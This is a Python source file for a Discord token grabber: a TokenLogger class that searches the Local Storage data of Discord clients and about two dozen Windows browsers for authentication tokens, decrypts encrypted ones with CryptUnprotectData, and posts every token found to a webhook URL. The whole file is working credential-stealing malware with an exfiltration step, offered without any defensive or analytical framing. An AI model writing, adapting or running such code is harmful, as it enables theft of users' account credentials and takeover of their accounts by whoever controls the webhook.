from utils import *

import os
import re
import base64
import json
from win32crypt import CryptUnprotectData


class TokenLogger:
    def __init__(self, software_dir_name, webhook_url):
        self.software_dir_name = software_dir_name
        self.webhook_url = webhook_url
        self.log_file = os.path.join(
            get_logs_path(self.software_dir_name), "token_log.txt"
        )
        self.interval = 600

    # I have no clue if this works. Need to test on Windows machine tmrw
    def extract_tokens(self):
        try:
            base_url = "https://discord.com/api/v9/users/@me"
            appdata = os.getenv("localappdata")
            roaming = os.getenv("appdata")
            tokens = []

            regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
            regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

            paths = {
                "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
                "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
                "Lightcord": roaming + "\\Lightcord\\Local Storage\\leveldb\\",
                "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
                "Opera": roaming
                + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
                "Opera GX": roaming
                + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
                "Amigo": appdata + "\\Amigo\\User Data\\Local Storage\\leveldb\\",
                "Torch": appdata + "\\Torch\\User Data\\Local Storage\\leveldb\\",
                "Kometa": appdata + "\\Kometa\\User Data\\Local Storage\\leveldb\\",
                "Orbitum": appdata + "\\Orbitum\\User Data\\Local Storage\\leveldb\\",
                "CentBrowser": appdata
                + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\",
                "7Star": appdata
                + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\",
                "Sputnik": appdata
                + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\",
                "Vivaldi": appdata
                + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
                "Chrome SxS": appdata
                + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\",
                "Chrome": appdata
                + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
                "Chrome1": appdata
                + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
                "Chrome2": appdata
                + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
                "Chrome3": appdata
                + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
                "Chrome4": appdata
                + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
                "Chrome5": appdata
                + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
                "Epic Privacy Browser": appdata
                + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\",
                "Microsoft Edge": appdata
                + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
                "Uran": appdata
                + "\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\",
                "Yandex": appdata
                + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
            }

            for platform, path in paths.items():
                if not os.path.exists(path):
                    continue
                for file_name in os.listdir(path):
                    if not file_name.endswith(".log") and not file_name.endswith(
                        ".ldb"
                    ):
                        continue
                    try:
                        with open(
                            os.path.join(path, file_name), "r", errors="ignore"
                        ) as f:
                            for line in f.readlines():
                                for match in re.findall(regexp, line):
                                    token = match.split(".")[0]
                                    tokens.append(token)
                                for match in re.findall(regexp_enc, line):
                                    uid, enc = match.split(":")
                                    try:
                                        enc = base64.b64decode(enc)
                                        if enc[0] == 0x41:
                                            # Assuming CryptUnprotectData is defined somewhere
                                            raw_data = CryptUnprotectData(
                                                enc, None, None, None, 0
                                            )[1].decode()
                                            uid = uid.replace('"', "")
                                            if raw_data and "token" in raw_data:
                                                tokens.append(
                                                    json.loads(raw_data)["token"]
                                                )
                                    except Exception as e:
                                        print(f"Error decoding token: {e}")
                    except Exception as e:
                        print(f"Error reading file {file_name}: {e}")

            if tokens:
                send_webhook(self.webhook_url, f"```✅ Tokens: {', '.join(tokens)}```")
            else:
                send_webhook(self.webhook_url, "```❌ No tokens found```")
        except Exception as e:
            send_webhook(self.webhook_url, f"```❌ Error extracting tokens: {e}```")

    def start(self):
        self.extract_tokens()
        return
